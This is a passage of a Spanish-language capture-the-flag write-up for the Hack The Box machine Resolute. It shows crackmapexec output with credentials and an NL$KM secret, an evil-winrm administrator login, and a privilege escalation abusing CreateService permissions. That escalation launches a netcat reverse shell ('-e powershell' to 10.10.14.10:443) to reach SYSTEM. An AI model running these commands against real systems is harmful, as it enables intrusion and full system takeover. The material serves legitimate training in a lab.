+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">NL$KM:d8337f7ba32cde15cfb49a10373f6ba94e4946705727e81ee8a911a81def190ccc4392f39cc7511a06566d60da73227481ecb49f69fc6a8ac852e6f503560d59</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos que la <code class="language-plaintext highlighter-rouge">contraseña</code> sea valida y nuevamente nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u Administrator -p DontH4ckUsPleeze!
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\Administrator:DontH4ckUsPleeze! </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> usando la contraseña del usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y asi obtener una <code class="language-plaintext highlighter-rouge">powershell</code> y leer la <code class="language-plaintext highlighter-rouge">flag</code> final root.txt</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i megabank.local -u Administrator -p DontH4ckUsPleeze!  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+megabank\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+004**************************5a8
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra3">
+<br><h3 class="post-title">Extra - Pwn3d! (ryan)</h3><br>
+
+<p class="plain-text">Antes habiamos visto que <code class="language-plaintext highlighter-rouge">crackmapexec</code> al pasarle las credenciales del usuario <code class="language-plaintext highlighter-rouge">ryan</code> nos devolvia el mensaje <code class="language-plaintext highlighter-rouge">Pwn3d!</code> aunque este no tenia privilegios en los <code class="language-plaintext highlighter-rouge">recursos</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u ryan -p Serv3r4Admin4cc123!
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\ryan:Serv3r4Admin4cc123! </span><span class="am">(Pwn3d!)</span><span class="p">
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb megabank.local -u ryan -p Serv3r4Admin4cc123! --shares
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="az">[*] </span><span class="p">Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">megabank.local\ryan:Serv3r4Admin4cc123! </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">NETLOGON        READ            Logon server share 
+</span><span class="az">SMB         </span><span class="p">megabank.local  445    RESOLUTE         </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para entender el porque necesitamos leer un poco el codigo de <code class="language-plaintext highlighter-rouge">crackmapexec</code>, iniciamos con el <a href="https://github.com/Porchetta-Industries/CrackMapExec/blob/f884fcd84a53fe4f09880ae821653dc92b931db9/cme/data/cme.conf#L4">conf</a> que define la variable <code class="language-plaintext highlighter-rouge">pwn3d_label</code> con el mensaje Pwn3d!</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[CME]
+workspace </span><span class="o">= </span><span class="p">default
+last_used_db </span><span class="o">= </span><span class="p">smb
+pwn3d_label </span><span class="o">= </span><span class="p">Pwn3d!
+audit_mode </span><span class="o">=</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después vamos con el <a href="https://github.com/Porchetta-Industries/CrackMapExec/blob/f884fcd84a53fe4f09880ae821653dc92b931db9/cme/protocols/smb.py#L461">smb.py</a> podemos ver que si <code class="language-plaintext highlighter-rouge">self.admin_privs</code> esta en <code class="language-plaintext highlighter-rouge">True</code> este mostrara <code class="language-plaintext highlighter-rouge">pwn3d_label</code> lo que equivale a ver el mensaje <code class="language-plaintext highlighter-rouge">Pwn3d!</code> por la consola</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">if </span><span class="p">self.admin_privs:
+    self.db.add_admin_user(</span><span class="s">'plaintext'</span><span class="p">, domain, self.username, self.password, self.host)
+
+out </span><span class="o">=</span><span class="no"> u</span><span class="s">'</span><span class="mi">{}\\{}</span><span class="s">:</span><span class="mi">{} {}</span><span class="s">'</span><span class="p">.format(domain,
+                             self.username,
+                             self.password </span><span class="o">if not </span><span class="p">self.config.get(</span><span class="s">'CME'</span><span class="p">, </span><span class="s">'audit_mode'</span><span class="p">) </span><span class="o">else </span><span class="p">self.config.get(</span><span class="s">'CME'</span><span class="p">, </span><span class="s">'audit_mode'</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">,  
+                             highlight(</span><span class="s">'(</span><span class="mi">{}</span><span class="s">)'</span><span class="p">.format(self.config.get(</span><span class="s">'CME'</span><span class="p">, </span><span class="s">'pwn3d_label'</span><span class="p">)) </span><span class="o">if </span><span class="p">self.admin_privs </span><span class="o">else </span><span class="s">''</span><span class="p">))</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente en el codigo de <a href="https://github.com/Porchetta-Industries/CrackMapExec/blob/f884fcd84a53fe4f09880ae821653dc92b931db9/cme/protocols/smb.py#L602">smb.py</a> encontramos que <code class="language-plaintext highlighter-rouge">self.admin_privs</code> se setea a <code class="language-plaintext highlighter-rouge">True</code> si en los privilegios de los servicios son iguales a el codigo <code class="language-plaintext highlighter-rouge">0xF003F</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">try</span><span class="p">:
+</span><span class="c1">    # 0xF003F - SC_MANAGER_ALL_ACCESS
+    # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx</span><span class="p">
+    ans </span><span class="o">= </span><span class="p">scmr.hROpenSCManagerW(dce,</span><span class="s">'</span><span class="mi">{}\x00</span><span class="s">'</span><span class="p">.format(self.host),</span><span class="s">'ServicesActive</span><span class="mi">\x00</span><span class="s">'</span><span class="p">, </span><span class="mi">0xF003F</span><span class="p">)
+    self.admin_privs </span><span class="o">= </span><span class="mi">True
+</span><span class="o">except </span><span class="p">scmr.DCERPCException </span><span class="o">as </span><span class="p">e:
+    self.admin_privs </span><span class="o">= </span><span class="mi">False
+    </span><span class="o">pass</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos los privilegios del <code class="language-plaintext highlighter-rouge">SCM</code> o Service Control Manager, con <code class="language-plaintext highlighter-rouge">sc.exe</code> nos devuelve un sc.exe con los <code class="language-plaintext highlighter-rouge">privilegios</code> representados en la sintaxis <code class="language-plaintext highlighter-rouge">SDDL</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">sc.exe </span><span class="p">sdshow scmanager
+
+D:(A;;KA;;;S-1-5-21-1392959593-3013219662-3596683436-1105)(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)  
+
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La primera parte de este corresponde a los privilegios del <code class="language-plaintext highlighter-rouge">SID</code> perteneciente a <code class="language-plaintext highlighter-rouge">ryan</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">Get-AdUser </span><span class="c1">-Identity </span><span class="p">ryan | </span><span class="am">Select </span><span class="p">SID  
+
+SID
+---
+S-1-5-21-1392959593-3013219662-3596683436-1105
+
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando lo correspondiente a la sintaxis en <a href="https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/">SDDL</a> vemos que ryan tiene el privilegio <code class="language-plaintext highlighter-rouge">KEY ALL ACCESS</code> correspondiente al codigo <code class="language-plaintext highlighter-rouge">0xF003F</code> que compara crackmapexec</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">“A”     ACCESS ALLOWED
+“KA”    KEY ALL ACCESS  0xF003F</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para intentar explotarlo podemos crear un nuevo <code class="language-plaintext highlighter-rouge">servicio</code> que nos ejecute el <code class="language-plaintext highlighter-rouge">netcat.exe</code> en el arranque para enviarnos una shell, y aunque nos deja crearlo al intentar <code class="language-plaintext highlighter-rouge">iniciar</code> el servicio nos devuelve el mensaje <code class="language-plaintext highlighter-rouge">Access is denied</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">sc.exe </span><span class="p">create test binpath='C:\ProgramData\netcat.exe 10.10.14.10 443 -e powershell'  
+[SC] CreateService SUCCESS
+PS C:\Users\ryan\Documents> </span><span class="am">sc.exe </span><span class="p">start test
+[SC] StartService: OpenService FAILED 5:
+
+Access is denied.
+
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de buscar un poco, podemos encontrar la <a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">investigación</a> de vbscrub el cual nos explica que al usar la función <code class="language-plaintext highlighter-rouge">CreateServiceW</code> y especificar el nivel de acceso el <code class="language-plaintext highlighter-rouge">ACL</code> no nos aplica ninguna restriccion, asi que al especificar <code class="language-plaintext highlighter-rouge">SERVICE_ALL_ACCESS</code> podemos tener <code class="language-plaintext highlighter-rouge">control</code> total sobre el servicio creado por lo que podemos ejecutarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">' Connect to SCM (Service Control Manager) and get a handle that allows us to create services by specifying SC_MANAGER_CREATE_SERVICE. 
+' Would fail with access denied here if we don't have permission to create services)</span><span class="p">
+ScmHandle </span><span class="o">= </span><span class="p">WinApi.OpenSCManager(</span><span class="no">Nothing</span><span class="p">, </span><span class="no">Nothing</span><span class="p">, WinApi.SCM_RIGHTS.SC_MANAGER_CREATE_SERVICE)
+</span><span class="o">If </span><span class="p">ScmHandle </span><span class="o">= </span><span class="p">IntPtr.Zero </span><span class="o">Then
+    Throw </span><span class="no">New </span><span class="na">Win32Exception</span><span class="p">()
+</span><span class="o">End If
+
+Try
+</span><span class="c1">    ' Create a new service and get back a handle to the service (that can then be used with StartService function and other service functions). 
+    ' We specify SERVICE_ALL_ACCESS so that this handle allows us full control over the service (to start it, stop it, delete it, etc) and for some  
+    ' reason this works. If we try to request this level of access afterwards by using the OpenService function, it fails with access denied</span><span class="p">
+    ServiceHandle </span><span class="o">= </span><span class="p">WinApi.CreateService(ScmHandle,
+                                        ServiceName,
+                                        </span><span class="no">Nothing</span><span class="p">,
+                                        WinApi.SERVICE_RIGHTS.SERVICE_ALL_ACCESS,
+                                        WinApi.SERVICE_WIN32_OWN_PROCESS,
+                                        WinApi.SERVICE_DEMAND_START,
+                                        WinApi.SERVICE_ERROR_NORMAL,
+                                        ExePath,
+                                        </span><span class="no">Nothing</span><span class="p">, </span><span class="no">Nothing</span><span class="p">, </span><span class="no">Nothing</span><span class="p">, </span><span class="s">"NT Authority\System"</span><span class="p">, </span><span class="no">Nothing</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para explotarlo podemos usar el <a href="https://github.com/VbScrub/ServiceInstallerTest">exe</a> creado con estas espeficicaciones y subirlo a la máquina aprovechando la función <code class="language-plaintext highlighter-rouge">upload</code> la cual esta incluida en evil-winrm</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">upload </span><span class="p">ServiceInstallTest.exe
+</span><span class="az">
+Info: Uploading ServiceInstallTest.exe to C:\Users\ryan\Documents\ServiceInstallTest.exe  
+</span><span class="sa">
+Data: 20480 bytes of 20480 bytes copied
+</span><span class="az">
+Info: Upload successful!
+</span><span class="p">
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El exe requiere 2 <code class="language-plaintext highlighter-rouge">argumentos</code>, el primero es el nombre del <code class="language-plaintext highlighter-rouge">servicio</code> y el segundo el comando a ejecutar, como <code class="language-plaintext highlighter-rouge">comando</code> le pasearemos el <code class="language-plaintext highlighter-rouge">netcat.exe</code> con una revshell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\ryan\Documents> </span><span class="am">.\ServiceInstallTest.exe </span><span class="p">pwned </span><span class="az">'C:\ProgramData\netcat.exe 10.10.14.10 443 -e powershell'</span><span class="p">  
+Error: Service has been created but was unable to start due to error: The service did not respond to the start or control request in a timely fashion  
+PS C:\Users\ryan\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de ejecutarlo aunque devuelve un pequeño error crea el <code class="language-plaintext highlighter-rouge">servicio</code> y al iniciarlo nos envia la <code class="language-plaintext highlighter-rouge">powershell</code> como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.96.155
+Windows PowerShell 
+Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32> </span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt  
+004**************************5a8
+PS C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
